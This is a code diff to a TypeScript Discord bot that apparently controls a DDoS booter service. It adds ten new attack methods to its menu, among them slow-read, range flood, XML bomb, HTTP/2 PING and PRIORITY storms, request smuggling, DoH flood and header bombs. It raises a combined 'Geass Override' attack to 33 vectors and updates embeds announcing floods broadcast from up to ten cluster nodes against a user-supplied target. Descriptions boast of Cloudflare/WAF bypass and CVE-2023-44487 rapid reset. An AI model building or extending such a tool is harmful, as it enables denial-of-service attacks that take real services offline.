@@ -51,7 +51,7 @@ if (!BOT_TOKEN) {
 // ── Method definitions with layer grouping for the select menu ──────────────
 const METHOD_OPTIONS = [
   // ── Geass / Special ────────────────────────────────────────────────────
-  { value: "geass-override",      label: "👁️ Geass Override ∞ [ARES 30v]",    description: "MAX POWER — 30 real vectors: ConnFlood+Slow+H2RST+H2CONT+HPACK+WAF+WS+GQL+RUDY2+Cache+HTTPBypass+KAExhaust+H2Storm+Pipeline+H2Ping+Smuggling+TLSRenego+SSLDeath+QUIC+XMLBomb+SlowRead+RangeFlood+SYN+ICMP+DNS+NTP+Mem+SSDP+UDP+DoH", emoji: "👁️" },
+  { value: "geass-override",      label: "👁️ Geass Override ∞ [ARES 33v]",    description: "MAX POWER — 33 vectors: ConnFlood+Slow+H2RST+H2CONT+HPACK+WAF+WS+GQL+RUDY2+Cache+HTTPBypass+KAExhaust+H2Storm+Pipeline+H2Ping+Smuggling+TLSRenego+SSLDeath+QUIC+XMLBomb+SlowRead+RangeFlood+AppSmart+LHBomb+H2Prio+SYN+ICMP+DNS+NTP+Mem+SSDP+UDP+DoH", emoji: "👁️" },
   // ── L7 Application ─────────────────────────────────────────────────────
   { value: "waf-bypass",          label: "🟣 Geass WAF Bypass ∞",            description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF",                     emoji: "🟣" },
   { value: "http2-flood",         label: "⚡ HTTP/2 Rapid Reset",             description: "CVE-2023-44487 — 512-stream RST burst per session, millions req/s",               emoji: "⚡" },
@@ -79,6 +79,17 @@ const METHOD_OPTIONS = [
   { value: "dns-amp",             label: "📛 DNS Water Torture [CDN-bypass]", description: "Floods NS servers with random subdomains — bypasses Cloudflare/CDN entirely, NS servers unprotected", emoji: "📛" },
   { value: "mem-amp",             label: "💾 Memcached UDP Flood [binary]",  description: "Real Memcached binary protocol UDP — get+stats to port 11211, exposed servers common", emoji: "💾" },
   { value: "ssdp-amp",            label: "📡 SSDP M-SEARCH Flood [UPnP]",   description: "Real SSDP protocol to port 1900 — rotates ST targets, random CPFN header, UPnP stack exhaustion", emoji: "📡" },
+  // ── ARES OMNIVECT ∞ — Advanced Vectors ────────────────────────────────
+  { value: "slow-read",           label: "🐌 Slow Read — TCP Buffer Exhaust",         description: "Pauses TCP recv window — server send buffer fills, all threads block on write",                   emoji: "🐌" },
+  { value: "range-flood",         label: "📐 Range Flood — 500× I/O",                 description: "500 byte-range sub-requests per req — server disk/IO seek queue exhausted",                        emoji: "📐" },
+  { value: "xml-bomb",            label: "💾 XML Bomb — Billion Laughs XXE",           description: "Nested XML entity expansion — parser OOM crash on any SOAP/XMLRPC endpoint",                      emoji: "💾" },
+  { value: "h2-ping-storm",       label: "🏓 H2 PING Storm — RFC 7540 §6.7",          description: "10K PING frames/sec per conn — server must ACK every one; CPU + queue exhaustion",              emoji: "🏓" },
+  { value: "http-smuggling",      label: "🎭 HTTP Request Smuggling — TE/CL Desync",  description: "Transfer-Encoding/Content-Length desync — poisons backend request queue permanently",           emoji: "🎭" },
+  { value: "doh-flood",           label: "🌐 DoH Flood — DNS-over-HTTPS Exhaust",     description: "Wire-format DNS queries via HTTPS — exhausts recursive resolver thread pool",                    emoji: "🌐" },
+  { value: "keepalive-exhaust",   label: "⛓️ Keepalive Exhaust — 128-Req Pipeline",  description: "128-request pipeline per conn held open 15–30s — MaxKeepAliveRequests saturation",             emoji: "⛓️" },
+  { value: "app-smart-flood",     label: "🎯 App Smart Flood — DB Query Exhaust",     description: "POSTs to /login /search /checkout with random data — forces uncacheable DB query per request",   emoji: "🎯" },
+  { value: "large-header-bomb",   label: "💣 Large Header Bomb — 16KB Overflow",      description: "16KB of randomized headers per request — exhausts HTTP parser buffer allocation on server",       emoji: "💣" },
+  { value: "http2-priority-storm",label: "🌀 H2 PRIORITY Storm — Stream Reorder",     description: "PRIORITY frames force server to rebuild stream dependency tree per frame — CPU + heap OOM",       emoji: "🌀" },
 ];
 
 // ── Duration presets ─────────────────────────────────────────────────────────
@@ -721,7 +732,7 @@ async function handleCluster(interaction: ChatInputCommandInteraction): Promise<
           .setTitle("👁️ CLUSTER BROADCAST — GEASS OVERRIDE FIRING...")
           .setDescription(
             `> *"By the power of Geass, I command ALL nodes — submit to my absolute authority!"*\n\n` +
-            `🌐 Broadcasting **ARES OMNIVECT ∞** to **all cluster nodes** — 30 vectors × 10 machines`
+            `🌐 Broadcasting **ARES OMNIVECT ∞** to **all cluster nodes** — 33 vectors × 10 machines`
           )
           .addFields(
             { name: "🎯 Target",  value: `\`${target}\``,        inline: true },
@@ -748,7 +759,7 @@ async function handleCluster(interaction: ChatInputCommandInteraction): Promise<
             .setColor(COLORS.CRIMSON)
             .setTitle(`👁️ CLUSTER BROADCAST ACTIVE — ${nodesOnline} NODES FIRING`)
             .setDescription(
-              `👁️ **ARES OMNIVECT ∞ × ${nodesOnline}** — All cluster nodes running 30 simultaneous attack vectors\n\n` +
+              `👁️ **ARES OMNIVECT ∞ × ${nodesOnline}** — All cluster nodes running 33 simultaneous attack vectors\n\n` +
               `Primary attack **#${attack.id}** monitoring below. Peer nodes fire independently.`
             )
             .setImage("attachment://lelouch.gif")
@@ -805,7 +816,7 @@ async function handleGeass(interaction: ChatInputCommandInteraction): Promise<vo
           { name: "🎯 Target",   value: `\`${target}\``,        inline: true },
           { name: "⏱ Duration",  value: `**${duration}s**`,      inline: true },
           { name: "🧵 Threads",  value: `**${threads}** (base)`, inline: true },
-          { name: "📊 Status",   value: "🔴 **INITIALIZING 30 VECTORS — ARES OMNIVECT ∞ COMMAND...**", inline: false },
+          { name: "📊 Status",   value: "🔴 **INITIALIZING 33 VECTORS — ARES OMNIVECT ∞ COMMAND...**", inline: false },
         )
         .setFooter({ text: AUTHOR })
         .setTimestamp()
